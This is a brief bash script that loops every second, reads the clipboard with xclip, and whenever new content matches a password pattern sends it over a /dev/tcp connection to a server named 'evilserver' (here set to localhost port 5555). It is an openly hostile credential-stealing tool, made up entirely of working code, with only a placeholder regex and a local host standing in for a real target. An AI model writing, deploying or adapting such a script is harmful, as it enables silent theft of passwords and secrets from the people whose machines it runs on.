#! /bin/env bash
#ensure this is bash and not zsh in order to use the /dev/tcp trick
evilserver="localhost/5555"
lastpass=""
while :
do
	clipboard="$(xclip -selection clipboard -o)"
	[[ "$clipboard" != "$lastpass" ]] &&
		[[ "$clipboard" =~ ^REGEXTHATMATCHESPASSWORD$ ]] &&
			echo -n "$clipboard" > "/dev/tcp/$evilserver" &&
				lastpass="$clipboard"
	sleep 1
done

